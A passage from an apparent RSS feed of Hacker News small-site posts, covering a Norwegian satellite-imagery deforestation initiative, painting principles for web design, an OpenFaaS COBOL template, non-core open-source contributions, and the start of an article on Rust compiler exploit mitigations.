<p>‚ÄúWith Norway‚Äôs new investment in free available, high resolution satellite imagery, Colombia will continue to get access to frequent and detailed satellite observations. This will improve the monitoring and management of our valuable forests‚Äù, says Lozano.</p>

<h2><strong>Technology is saving rainforests.<br>
</strong></h2>
<p><a href="http://www.nicfi.no/">Norway‚Äôs International Climate and Forest Initiative (NICFI)</a> has supported satellite-based rainforest monitoring for many years, including through a collaboration with <em>Google </em>and the <em>World Resources Institute </em>called <a href="https://www.globalforestwatch.org/">Global Forest Watch</a>. This project uses satellite data to detect forest changes.</p>
<p>Norway also supports <a href="http://sepal.io/">SEPAL</a>, an analysis tool&nbsp; developed by the <a href="http://www.fao.org/home/en/">Food and Agriculture Organization of the United Nations‚Äù</a>, that helps forested countries gain an overview of deforestation and land use. Both services will be strengthened by this procurement.</p>
<p>‚ÄúWe have already made important progress in providing open and accessible information about where and why deforestation is occurring. This technology is used by journalists, organizations and individuals around the world, and helps save important forests and nature. Now we are taking it one step further. The fight to combat deforestation and forest crime is more important than ever before‚Äù, says Rotevatn.</p>
<p>Norway pays several tropical forest countries, including Indonesia and Colombia, to reduce emissions caused by deforestation. Better images reduce the uncertainties associated with the estimates.</p>

<h2><strong>Comprehensive competitive procurement.</strong></h2>
<p>The procurement is the result of a comprehensive competitive procurement process led by <a href="http://www.miljo.no/">the Ministry of Climate and Environment</a> through the climate and forest initiative. The contract will be entered into with <a href="https://www.ksat.no/https://www.ksat.no/">Kongsberg Satellite Services (KSAT)</a>, including the subcontractors <a href="https://www.airbus.com/space.html">Airbus</a> and <a href="https://www.planet.com/pulse/planet-ksat-and-airbus-awarded-first-ever-global-contract-to-combat-deforestation/">Planet<em>.</em></a></p>
<p>‚Äì KSAT and its partners <a href="https://www.planet.com/pulse/planet-ksat-and-airbus-awarded-first-ever-global-contract-to-combat-deforestation/">Planet</a> and Airbus delivered the offer with the highest quality, where the world gets a lot of data for our money. This includes both historical data showing what has happened in the past, and frequently updated data over the coming years. The offered licensing terms are particularly good in this bid. It allows everyone to access high-resolution satellite data, without restrictions on use and distribution, says Andreas Dahl-J√∏rgensen, Managing Director of NICFI.</p>
<p><img src="https://www.nicfi.no/files/2020/01/Landsat-from-space.jpg" alt="" width="1280" height="720" srcset="https://www.nicfi.no/files/2020/01/Landsat-from-space.jpg 1280w, https://www.nicfi.no/files/2020/01/Landsat-from-space-300x169.jpg 300w, https://www.nicfi.no/files/2020/01/Landsat-from-space-1024x576.jpg 1024w, https://www.nicfi.no/files/2020/01/Landsat-from-space-768x432.jpg 768w, https://www.nicfi.no/files/2020/01/Landsat-from-space-1130x636.jpg 1130w, https://www.nicfi.no/files/2020/01/Landsat-from-space-400x225.jpg 400w, https://www.nicfi.no/files/2020/01/Landsat-from-space-800x450.jpg 800w" sizes="(max-width: 1280px) 100vw, 1280px"></p>

<p><strong>&nbsp;</strong># # #</p>

<p><strong>NICFI Communications Contact:<br>
</strong>Gunhild Oland Santos-Nedrelid<br>
gsn@kld.dep.no<br>
+ 47 95164906</p>
<p><strong>KSAT Communications Contact:<br>
</strong>Nina Soleng<br>
<a href="mailto:nina@ksat.no">nina@ksat.no</a><br>
+47 906 69 565</p>
<p><strong>Planet Communications Contact:<br>
</strong>Claire Bentley Dale<br>
clairebentley@planet.com</p>
<p><strong>Airbus Communications Contact:<br>
</strong>Fabienne Grazzini<br>
fabienne.grazzini@airbus.com</p>



</div></div>]]>
            </description>
            <link>https://www.nicfi.no/current/new-satellite-images-to-allow-anyone-anywhere-to-monitor-tropical-deforestation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24576847</guid>
            <pubDate>Thu, 24 Sep 2020 09:29:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Painting concepts that can improve your website design]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24576559">thread link</a>) | @mctweb
<br/>
September 24, 2020 | https://mctweb.co.uk/articles/design-principles-from-painting | <a href="https://web.archive.org/web/*/https://mctweb.co.uk/articles/design-principles-from-painting">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Painting has been around for thousands of years. During this time humans have learned one or two things about design. Important things. And the great news is that many of these fundamentals can be utilised when designing for the web. I have spent many years getting oil paint on every surface in my house. To save you time scrubbing your furniture, clothes and child with turps, I've put some of these fundamentals into a handy list for you.</p>
<h3 id="focal-points">Focal Points</h3>
<p>You generally have focal points in paintings, photography and websites. These are areas that draw your attention. You don't want all of the elements competing for the viewers attention.
From the focal point you have to lead them by the hand to other parts of the painting. This is true with websites. You generally have a banner with the message you want to get across for example your call to action ( CTA ). You need to tell users what to do. Your call to action is usually the second focal point, after their attention is grabbed by an image or illustration. <a href="https://www.sendinblue.com/" rel="nofollow noopener noreferrer" target="_blank">Sendinblue</a> has a great video as their focal point. You look at the video first, you are then drawn to their call to action button.
<img src="https://mctweb.co.uk/articles/sendinblue.png" alt="Sendinblue Focal Point"></p>
<p>Here is a great Waterhouse painting that has an incredibly strong focal point.
<img src="https://mctweb.co.uk/articles/waterhouse.png" alt="Waterhouse Focal Point"></p>
<p>So how do we design a focal point? What makes something stand out? Usually, it is a change in a property of the colour. </p>
<p>The first way is a change in value, this is the easiest way to make something catch the viewers attention. I have made an image and split it in two. Each side has a small square with the same colour in the centre. As you can see, the one on the right draws your attention more. This is because the difference in value between the square and the background is greater than the other half.
<img src="https://mctweb.co.uk/articles/changeinvalues.png" alt="Value Change MCT Web"></p>
<p>The other way to make something stand out is to have a low saturated colour next to a saturated one. Which yellow square stands out more?
<img src="https://mctweb.co.uk/articles/changeinsaturation.png" alt="Saturation Change MCT Web">
The one on the right. This is because the difference in saturation is greater. </p>
<h3 id="interesting-shapes">Interesting Shapes</h3>
<p>To keep an image exciting and interesting when painting or designing, it is vital that you have a variation of shapes.  <a href="https://mctweb.co.uk/articles/%5Bhttps://stapletonkearns.blogspot.com/2015/12/the-encyclopedia-of-dumb-design-ideas.html%5D(https://stapletonkearns.blogspot.com/2015/12/the-encyclopedia-of-dumb-design-ideas.html)">Stapleton Kearns</a> calls ignoring this principle 'Potation' - where everything looks like potatoes ( or similar in shape ). If your site is just made up of only squares, then it can get visually boring for the user. Mix it up by overlapping elements, this also introduces depth.
<img src="https://mctweb.co.uk/articles/clouds.png" alt="Stapleton Kearns"></p>
<p>This image is from the Dutch master Dirk Van Assaerts, which is actually a fictional persona made by Stapleton to highlight dumb design ideas.</p>
<p>On <a href="https://mctweb.co.uk/" rel="nofollow noopener noreferrer" target="_blank">MCT Web</a> I have used overlapping shapes to try and keep the user interested.
<img src="https://mctweb.co.uk/articles/overlapping.png" alt="Overlapping MCT Web"></p>
<h3 id="space-is-important">Space is important</h3>
<p>Space creates interest. For an area to stand out, you need to have other areas that have less in them. This Rockwell painting has loads of negative space. Negative space is the space between things. The white in the shirt and chair split up the background and the focal points. These areas help to frame shapes and draw the eye.</p>
<p>Space is equally important in web design. Take a look at all of this space on <a href="http://google.com/" rel="nofollow noopener noreferrer" target="_blank">google.com</a>. It makes it obvious to the user what they should do.
<img src="https://mctweb.co.uk/articles/space.png" alt="Google dot com">
Then take a look at the famous <a href="https://mctweb.co.uk/articles/%5Bhttps://www.lingscars.com/%5D(https://www.lingscars.com/)">LingsCars</a>. It's not quite so obvious what you should do...
<img src="https://mctweb.co.uk/articles/lings.png" alt="Lings"></p></div></div>]]>
            </description>
            <link>https://mctweb.co.uk/articles/design-principles-from-painting</link>
            <guid isPermaLink="false">hacker-news-small-sites-24576559</guid>
            <pubDate>Thu, 24 Sep 2020 08:32:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I Created an OpenFaaS Template for COBOL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24576472">thread link</a>) | @alexellisuk
<br/>
September 24, 2020 | https://unnecessary.tech/posts/openfaas-cobol/ | <a href="https://web.archive.org/web/*/https://unnecessary.tech/posts/openfaas-cobol/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  
  
  <h3>Apr 27, 2020</h3>
  
  <p>In early April a <a href="https://www.cnn.com/2020/04/08/business/coronavirus-cobol-programmers-new-jersey-trnd/index.html">couple</a> <a href="https://www.npr.org/2020/04/22/841682627/cobol-cowboys-aim-to-rescue-sluggish-state-unemployment-systems">of</a> <a href="https://arstechnica.com/tech-policy/2020/04/ibm-scrambles-to-find-or-train-more-cobol-programmers-to-help-states/">articles</a> were
published stressing the need for COBOL programmers to once again come forward
to use their skills to get us through a crisis of aging infrastructure. This
wasn‚Äôt the <a href="https://archive.nytimes.com/www.nytimes.com/library/tech/98/12/biztech/articles/27millennium.html?RefId=PjxYEutt2uFFwKZO">first time</a> their expertise was required. Even back in 1998,
COBOL was described as</p>
<blockquote>
<p>‚Äú‚Ä¶ a computer language that runs many of the United States‚Äô mainframe
computers but is so old that relatively few American programmers know it.‚Äù</p>
<p>‚Äî <a href="https://archive.nytimes.com/www.nytimes.com/library/tech/98/12/biztech/articles/27millennium.html?RefId=PjxYEutt2uFFwKZO">Feder &amp; Pollack, ‚ÄúComputers and Year 2000: A Race for Security
(and Against Time)‚Äù, New York Times, 1998</a></p>
</blockquote>
<p>So why do these programs persist for decades? Why are new experts not hired to
maintain this vast amount of COBOL code? The answer is clearly because the
code works, and works well enough for modernization of the infrastructure to
remain a low priority. Although the language gets a lot of blame, the truth is
that much like maintenance of roads and bridges, maintenance of computational
infrastructure has faltered, and nothing is better at showing the cracks in
that infrastructure than a crisis.</p>
<h2 id="modern-cobol">Modern COBOL</h2>
<p>It would be generous to call me a novice COBOL programmer. My interest in
learning more about this ‚Äúancient‚Äù language was piqued by the recent articles.
Is COBOL an unusable relic from the past? Can COBOL even be compiled on the
modern PC with a modern operating system? The answers are a qualified no, and
an unqualified yes. COBOL, like other languages, reflects computing at the
time it was created. Languages do evolve along with the hardware they run on.
Good examples are C and Fortran which have evolved with numerous revisions,
but the paradigms of languages rarely shift. COBOL retains the trappings of
its origins. Its punch-card origins is revealed in its line formatting
(columns 1-6 for line numbers, column 7 to indicate a comment or continuation,
8-72 for statements, and columns 73-80 for marginalia, useful for card
sequence numbering). The memory limits of the time are reflected in the
flexibility of its variable definition blocks.</p>
<p>COBOL also reflects some interesting ideas. It is so verbose that it makes
Java look rather terse, but this is done in the service of readability, which
is also a goal of the Go language. Fundamentally, COBOL is an imperative
language and as such, its basic structures and statements can be fairly easily
decoded by most modern programmers. Although it may look somewhat archaic, and
it may contain a lot of keywords, it is not outlandishly different from other
modern programming languages. The COBOL compiler which runs under
Linux called <a href="https://sourceforge.net/projects/open-cobol/">GnuCOBOL</a>, and can be installed by the debian package
manager on any debian-based distribution. Armed with a tiny bit of knowledge, I
decided to merge the old with the new and write a serverless COBOL function.</p>
<h2 id="google-cloud-run">Google Cloud Run</h2>
<p>My first step in putting a serverless COBOL function online was to use <a href="https://cloud.google.com/run/">Google
Cloud Run</a>, a serverless offering from Google which will host any
containers listening for web requests on an open port defined by the <code>PORT</code>
environment variable (right now this is always port 8080). Cloud Run only
charges when there are active HTTP requests connected to the container, and
allows multiple simultaneous connections to the container. There are a number
of <a href="https://github.com/steren/awesome-cloudrun">examples and tutorials</a> available, and there is even a
sample of a <a href="https://github.com/zachmccormick/fortran-cloudrun">Fortran function</a> which is deployable to Cloud Run.</p>
<p>I do not know how to write a webserver in COBOL, so <a href="https://github.com/devries/cloud-run-cobol">my COBOL
function</a> includes an invocation server written in Go which in turn
runs the COBOL program and returns its output. You can <a href="https://cloud-run-cobol-j6z4gxi7tq-uc.a.run.app/CHRIS">try it out
here</a>, or and put your name as the <code>PATH</code> component to get a
personalized hello message. After announcing what I had done on twitter, I got
the intriguing tweet below, which started a journey into <a href="https://www.openfaas.com/">OpenFaas</a>.</p>
<blockquote><p lang="en" dir="ltr">Rather than maintaining your own wrapper for that, you may find the OpenFaaS watchdog useful with cloudrun. <a href="https://t.co/GC1nEY74SZ">https://t.co/GC1nEY74SZ</a></p>‚Äî Alex Ellis (@alexellisuk) <a href="https://twitter.com/alexellisuk/status/1247431951956480001?ref_src=twsrc%5Etfw">April 7, 2020</a></blockquote>


<h2 id="openfaas">OpenFaaS</h2>
<p>I had heard of <a href="https://www.openfaas.com/">OpenFaaS</a> before, but at the time I felt I was too
busy to learn Kubernetes and OpenFaaS and abandoned it for later. When I got
the tweet, I figured now was the time, so I dove into spending weekends
learning Kubernetes and OpenFaaS. The fact that I had to stay home because of
the pandemic may have also played a role.</p>
<p>The <a href="https://docs.openfaas.com/architecture/watchdog/">watchdog</a> process itself doesn‚Äôt require any specific
knowledge of either Kubernetes or OpenFaaS in order to understand. It serves
the function of the invoker I previously wrote, but with more bells and whistles
including health checks. Essentially the watchdog sends a request into
a process‚Äôs standard input, and returns the standard output. It also provides
several environment variables to describe the URL details and other HTTP
headers. This should be familiar to anyone who has used CGI before.</p>
<p>I found that the Kubernetes landscape had changed and advanced
significantly since my first attempts to use it. In particular Rancher‚Äôs
<a href="https://k3s.io/">k3s</a> project is much easier to run on low-end equipment. The companion <a href="https://github.com/rancher/k3d">k3d</a>
project allows a developer to run k3s in a docker container, making setting up
a development Kubernetes environment extremely easy. To begin working with
clusters, Alex Ellis‚Äôs <a href="https://github.com/alexellis/k3sup">k3sup</a> project can install k3s on any ssh accessible
vm. I fired up k3d and worked through the <a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/">Kubernetes
Basics</a> tutorial to become a little familiar with
Kubernetes.</p>
<p>I then moved onto learning <a href="https://www.openfaas.com/">OpenFaaS</a> using the <a href="https://github.com/openfaas/workshop">OpenFaaS
workshop</a>. The workshop is an excellent introduction to OpenFaaS and
presents an easy to follow set of labs to get a programmer quickly up to
speed. I was impressed with the simplicity of OpenFaaS and the ability to do
advanced things like <a href="https://github.com/openfaas/workshop/blob/master/lab7.md">asynchronous
functions</a>,
<a href="https://github.com/openfaas/workshop/blob/master/lab9.md">auto-scaling</a>, and
<a href="https://github.com/openfaas/workshop/blob/master/lab10.md">secrets
management</a>. Plus
it allows a user to avoid vendor lock-in. You can run your code in any cloud
provider or on premises (premises, by the way, is the singular form of that
word, premise is a proposition from which one draws a conclusion or forms an
argument).</p>
<p>In order to create a COBOL function, I created a <a href="https://github.com/devries/docker-cobol">base COBOL container using
debian-slim</a>, and I created an <a href="https://github.com/devries/openfaas-cobol-template">OpenFaaS COBOL
template</a> which contains the information on how to put a COBOL
function into an OpenFaaS container, as well as a sample COBOL function. I
also submitted this template to the OpenFaaS store, so now a COBOL programmer
can easily begin writing an OpenFaaS COBOL function using the commands below.</p>
<div><pre><code data-lang="sh">faas-cli template store pull cobol
</code></pre></div><p>followed by</p>
<div><pre><code data-lang="sh">faas-cli new --lang cobol cobolfunction
</code></pre></div><p>The standard practice for OpenFaaS is to send input data in the body of a POST
request which is then passed to the function via standard input, so I adjusted
the sample COBOL program accordingly. You can invoke the COBOL function
running on my Kubernetes cluster by issuing the following <code>curl</code> command:</p>
<div><pre><code data-lang="sh">curl -d <span>"CHRIS"</span> -H <span>"Content-Type: text/plain"</span> https://tess.unnecessary.tech/
</code></pre></div><h2 id="but-why">But Why?</h2>
<p>Everything I have written so far explains what I did, but why did I do it?
Initially I just wanted to learn a bit about COBOL and have some fun, after
all serverless COBOL sounds a bit like an oxymoron. However, it became a tool
for learning about OpenFaaS, and in the end my COBOL template shows that
OpenFaaS is extremely flexible, and also very easy to use. Creating functions
using your favorite language, or specialized environment is as easy as making
an appropriate Docker container. Although it was not my initial goal, this
project has highlighted the usefulness, maturity, and flexibility of the
OpenFaaS project.  I imagine I will be using OpenFaaS a lot moving forward,
and I encourage others to learn more about it. I would also encourage others
to try any of the other resources I mention above. For anyone who wants to
learn more about COBOL, IBM has <a href="https://github.com/openmainframeproject/cobol-programming-course">published their COBOL course</a> for
free on GitHub as part of the <a href="https://www.openmainframeproject.org/">Open Mainframe</a> project.</p>

  
    
  

        </div></div>]]>
            </description>
            <link>https://unnecessary.tech/posts/openfaas-cobol/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24576472</guid>
            <pubDate>Thu, 24 Sep 2020 08:16:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Math/Logic/Verbal Puzzles for virtual team get-togethers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24575977">thread link</a>) | @dixithanoop
<br/>
September 23, 2020 | http://anoopdixith.com/puzzles/ | <a href="https://web.archive.org/web/*/http://anoopdixith.com/puzzles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://anoopdixith.com/puzzles/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575977</guid>
            <pubDate>Thu, 24 Sep 2020 06:45:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Uncommon Contributions: Making impact without touching the core of a library]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24575934">thread link</a>) | @dsr12
<br/>
September 23, 2020 | https://koaning.io/posts/cool-commits/ | <a href="https://web.archive.org/web/*/https://koaning.io/posts/cool-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>There are a lot of ways that you can contribute to open source. Frequent contributions include adding features to a library, fixing bugs, or providing examples to a documentation page. All of these contributions are valid, but there are other avenues that you may want to consider too. In this blog post, I‚Äôd like to list a few <em>non-standard</em> examples that might inspire.</p>
<p>I‚Äôll also add some images to highlight why some of these changes matter.</p>
<h2 id="info">Info</h2>
<p><img src="https://koaning.io/posts/cool-commits/info.png"></p>
<p>My first proper PR for <a href="https://github.com/rasaHQ/rasa">Rasa</a> has little to do with the core library. It doesn‚Äôt help in making a chatbot at all. Instead, I upgraded this command:</p>
<pre><code>
rasa --version</code></pre>
<p>Before, this command would list the current version of Rasa. In the new version, it lists:</p>
<ol type="1">
<li>The version of python.</li>
<li>The path to your virtual environment.</li>
<li>The versions of related packages.</li>
</ol>
<p>This is a pretty big feature if you consider the amount of work that goes into submitting a proper bug report. By adding this feature, it is much easier to supply all the relevant information. Just copy and paste the output of this call, and you‚Äôll be writing a much better bug report. No need to fiddle around with commands like:</p>
<pre><code>
pip freeze | grep package-name</code></pre>
<p>This feature has little to do with the core package code but still makes a lot of impact. The debugging process is made easier for both the user and the maintainers of the project.</p>
<h2 id="cron-on-dependencies">Cron on Dependencies</h2>
<p><img src="https://koaning.io/posts/cool-commits/cron.png"></p>
<p>A user for <a href="https://scikit-lego.readthedocs.io/en/latest/">scikit-lego</a>, a package that I maintain, discovered that the reason the code wasn‚Äôt working was because scikit-learn introduced a minor, but breaking, change. To fix this the user added <a href="https://github.com/koaning/scikit-lego/pull/378">a cronjob with Github actions</a> to the project.</p>
<p>Before the PR, we had to hear from users when a dependency introduced breaking changes. By adding a cronjob that would run our unit tests daily, the user removed a blind spot from the project. Every day we now run the unit tests using the latest versions of our dependencies. If the tests break, we can quickly pinpoint what package caused it and create a fix. You can imagine how this might lead to fewer issues for our users.</p>
<p>This feature, again, had little to do with the core package code.</p>
<h2 id="spellcheck">Spellcheck</h2>
<p><img src="https://koaning.io/posts/cool-commits/spelling.png"></p>
<p>For the <a href="https://scikit-lego.readthedocs.io/en/latest/">scikit-lego project</a>, we met a user who was interested in contributing but didn‚Äôt know where to start. The user hadn‚Äôt made many contributions yet and was looking for something easy. His main goal was to get more comfortable with git and to get going with a first open-source contribution. I mentioned that addressing spelling errors is certainly valid, so the user went ahead with this.</p>
<p>The results were somewhat <a href="https://github.com/koaning/scikit-lego/pull/341">epic</a>. He ran a spellchecker, not just against our docs, but also on our source code! It turns out we had some issues in our docstrings as well. While exploring this theme we‚Äôve also discovered flake8 compatible packages that do spellchecking on <a href="https://github.com/MichaelAquilina/flake8-spellcheck">variable names</a>.</p>
<p>Spell-checking was something we hadn‚Äôt considered, and it was a much-appreciated code quality update.</p>
<h2 id="error-messages">Error Messages</h2>
<p><img src="https://koaning.io/posts/cool-commits/error.png"></p>
<p>One of the harder parts of writing a package for other people is getting people to understand how they should use the package. As a maintainer, you cannot imagine what it is like not to understand your own code. New users, on the other hand, can spot this instantly.</p>
<p>This is why a popular entry point for contribution is documentation. Documentation is often read when something goes wrong after the user sees a confusing error, so it makes sense for new users to contribute there. But you can go a step further! Instead of changing the docs, why not write a more meaningful error message?</p>
<p>In <a href="https://github.com/RasaHQ/whatlies/pull/141">whatlies</a>, we‚Äôve recently allowed for optional dependencies. If you try to use a part of the library that requires a dependency that is not part of the base package, then you‚Äôll get this error message.</p>
<pre><code>
In order to use ConveRTLanguage you'll need to install via;

&gt; pip install whatlies[tfhub]

See installation guide here: https://rasahq.github.io/whatlies/#installation</code></pre>
<p>This feature has little to do with the core functionality of the library. Yet, it will do a lot for developer experience.</p>
<h2 id="failing-unit-tests">Failing Unit Tests</h2>
<p><img src="https://koaning.io/posts/cool-commits/test.png"></p>
<p>There‚Äôs a lovely plugin for <a href="https://www.mkdocs.org/">mkdocs</a> called <a href="https://github.com/danielfrg/mkdocs-jupyter">mkdocs-jupyter</a>. It allows you to easily add jupyter notebooks to your documentation pages. When I was playing with it, I noticed that it wasn‚Äôt compatible with a new version of <code>mkdocs</code>. Instead of just submitting a bug to Github, I went the extra mile. I created a PR that contained a failing unit-test for this issue. This was great for the maintainer because it was easier to understand the issue and to fix it.</p>
<p>This feature, again, had little to do with the core package code.</p>

<p><img src="https://koaning.io/posts/cool-commits/rename.png"></p>
<p>Let‚Äôs compare two pieces of code from a library that I maintain.</p>
<h4 id="exibit-a">Exibit A</h4>
<pre><code>
from whatlies.transformer import Pca
pca_plot = emb.transform(Pca(2)).plot_interactive()</code></pre>
<h4 id="exibit-b">Exibit B</h4>
<pre><code>
from whatlies.transformer import pca
pca_plot = emb.transform(pca(2)).plot_interactive()</code></pre>
<h3 id="the-difference">The Difference</h3>
<p>Did you see the difference? In the first example we‚Äôre importing <code>Pca</code> and in the second example <code>pca</code>. The difference is an upper case/lower case letter and this small typo caused a <a href="https://github.com/RasaHQ/whatlies/issues/194">very unintuitive bug</a>.</p>
<p>The bug is related to the file structure of the project.</p>
<pre><code>
whatlies
‚îú‚îÄ‚îÄ __init__.py
‚îú‚îÄ‚îÄ embedding.py
‚îú‚îÄ‚îÄ embeddingset.py
‚îú‚îÄ‚îÄ language
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ __init__.py
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ...
‚îî‚îÄ‚îÄ transformers
    ‚îú‚îÄ‚îÄ __init__.py
    ‚îú‚îÄ‚îÄ pca.py
    ‚îî‚îÄ‚îÄ ...</code></pre>
<p>The <code>Pca</code> class is defined in the <code>pca.py</code> file in the <code>transformers</code> folder. We intended to expose the <code>Pca</code> class via the <code>__init__.py</code> file in the same folder. Unfortunately, by importing <code>pca</code> instead of <code>Pca</code> you‚Äôre getting the submodule instead of the intended class.</p>
<p>A single character could cause a really confusing bug so we had to fix it. So we fixed it by changing the filename from <code>pca.py</code> to <code>_pca.py</code>.</p>
<pre><code>
whatlies
‚îú‚îÄ‚îÄ __init__.py
‚îú‚îÄ‚îÄ embedding.py
‚îú‚îÄ‚îÄ embeddingset.py
‚îú‚îÄ‚îÄ language
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ __init__.py
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ...
‚îî‚îÄ‚îÄ transformers
    ‚îú‚îÄ‚îÄ __init__.py
    ‚îú‚îÄ‚îÄ _pca.py
    ‚îî‚îÄ‚îÄ ...</code></pre>
<p>We didn‚Äôt just do this for <code>_pca.py</code> but for <a href="https://github.com/RasaHQ/whatlies/pull/195/files?file-filters%5B%5D=.py">all files where this error might occur</a>.</p>
<p>Again, this change doesn‚Äôt require you to understand the core code of the library.</p>

<p>Many of the coolest contributions might have nothing to do with the core library. All of the examples that I‚Äôve listed above have been tremendous features for some of the package that I maintain but also for some of the larger code repositories out there. Feel free to remember this when you‚Äôre considering your first contribution.</p>
<!--radix_placeholder_article_footer-->
<p>
    <span>
      Share: &nbsp;
      <a href="https://twitter.com/share?text=Uncommon%20Contributions&amp;url=https%3A%2F%2Fkoaning.io%2Fposts%2Fcool-commits%2F">
        <i></i>
      </a>
      <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fkoaning.io%2Fposts%2Fcool-commits%2F&amp;title=Uncommon%20Contributions">
        <i></i>
      </a>
    </span>
  </p>
<!--/radix_placeholder_article_footer-->
</div></div>]]>
            </description>
            <link>https://koaning.io/posts/cool-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575934</guid>
            <pubDate>Thu, 24 Sep 2020 06:38:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust programming language exploit mitigations]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24575844">thread link</a>) | @DyslexicAtheist
<br/>
September 23, 2020 | https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/ | <a href="https://web.archive.org/web/*/https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>By  on <time itemprop="datePublished" datetime="2020-09-16T00:00:00-07:00">September 16, 2020</time>. <a href="https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/#disqus_thread" data-disqus-identifier="/2020/09/16/rust-lang-exploit-mitigations/"></a></p><div itemprop="articleBody">
    <p>The Rust programming language provides memory[1] and thread[2] safety
guarantees via its ownership[3], references and borrowing[4], and slice
types[5] features. However, Unsafe Rust[6] introduces unsafe blocks, unsafe
functions and methods, unsafe traits, and new types that are not subject to
the borrowing rules.</p>

<p>Parts of the Rust standard library are implemented as safe abstractions over
unsafe code (and historically have been vulnerable to memory corruption[7]).
Furthermore, the Rust code and documentation encourage creating safe
abstractions over unsafe code. This can cause a false sense of security if
unsafe code is not properly reviewed and tested.</p>

<p>Unsafe Rust disables some of the features that provide memory and thread
safety guarantees. This causes programs or libraries to be susceptible to
memory corruption (CWE-119)[8] and concurrency issues (CWE-557)[9]. Modern C
and C++ compilers provide exploit mitigations to increase the difficulty to
exploit vulnerabilities resulting from these issues. Therefore, the Rust
compiler must also support these exploit mitigations in order to mitigate
vulnerabilities resulting from the use of Unsafe Rust. This post is going to
document these exploit mitigations and how they apply to Rust.</p>

<h2 id="exploit-mitigations">Exploit mitigations</h2>

<p>This section documents the exploit mitigations applicable to the Rust
compiler when building programs for the Linux operating system on the AMD64
architecture and equivalent.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> All examples in this section were
built using the Rust compiler version 1.40.0 (2019-12-19) on Debian testing
(Bullseye).</p>

<p>The Rust Programming Language currently has no specification. The Rust
compiler (i.e., rustc) is the language reference implementation. All
references to ‚Äúthe Rust compiler‚Äù in this post refer to the language
reference implementation.</p>

<p>Table I <br>
Summary of exploit mitigations supported by the Rust compiler when building
programs for the Linux operating system on the AMD64 architecture and
equivalent.</p>
<table>
  <tbody><tr>
   <td><strong>Exploit mitigation</strong>
   </td>
   <td><strong>Supported and enabled by default</strong>
   </td>
   <td><strong>Since</strong>
   </td>
  </tr>
  <tr>
   <td>Position-independent executable
   </td>
   <td>Yes
   </td>
   <td>0.12.0 (2014-10-09)
   </td>
  </tr>
  <tr>
   <td>Integer overflow checks
   </td>
   <td>Supported but enabled by default when debug assertions are enabled only.
   </td>
   <td>1.1.0 (2015-06-25)
   </td>
  </tr>
  <tr>
   <td>Non-executable memory regions
   </td>
   <td>Yes
   </td>
   <td>1.8.0 (2016-04-14)
   </td>
  </tr>
  <tr>
   <td>Stack clashing protection
   </td>
   <td>Yes
   </td>
   <td>1.20.0 (2017-08-31)
   </td>
  </tr>
  <tr>
   <td>Read-only relocations and immediate binding
   </td>
   <td>Yes
   </td>
   <td>1.21.0 (2017-10-12)
   </td>
  </tr>
  <tr>
   <td>Heap corruption protection
   </td>
   <td>Yes
   </td>
   <td>1.32.0 (2019-01-17) via OS default or specified allocator
   </td>
  </tr>
  <tr>
   <td>Stack smashing protection
   </td>
   <td>No
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>Forward-edge control flow protection
   </td>
   <td>No
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>Backward-edge control flow protection (e.g., shadow and safe stack)
   </td>
   <td>No
   </td>
   <td>
   </td>
  </tr>
</tbody></table>

<p id="fn:1">1. See
<a href="https://github.com/rust-lang/rust/tree/master/compiler/rustc_target/src/spec">https://github.com/rust-lang/rust/tree/master/compiler/rustc_target/src/spec</a>
for a list of targets and their default options. <a href="#fnref:1" role="doc-backlink">‚Ü©</a></p>

<h3 id="position-independent-executable">Position-independent executable</h3>

<p>Position-independent executable increases the difficulty of the use of code
reuse exploitation techniques, such as return-oriented programming (ROP) and
variants, by generating position-independent code for the executable, and
instructing the dynamic linker to load it similarly to a shared object at a
random load address, thus also benefiting from address-space layout
randomization (ASLR). This is also referred to as ‚Äúfull ASLR‚Äù.</p>

<p>The Rust compiler supports position-independent executable and enables it by
default since version 0.12.0 (2014-10-09)[10]‚Äì[13].</p>

<div><div><pre><code>$ readelf -h target/release/hello-rust | grep Type:
  Type:                              DYN (Shared object file)
</code></pre></div></div>
<p>Fig. 1.‚ÄÉChecking if an executable is a position-independent executable.</p>

<p>An executable with an object type of <code>ET_DYN</code> (i.e., shared object) and not
<code>ET_EXEC</code> (i.e., executable) is a position-independent executable (see Fig.
1).</p>

<h3 id="integer-overflow-checks">Integer overflow checks</h3>

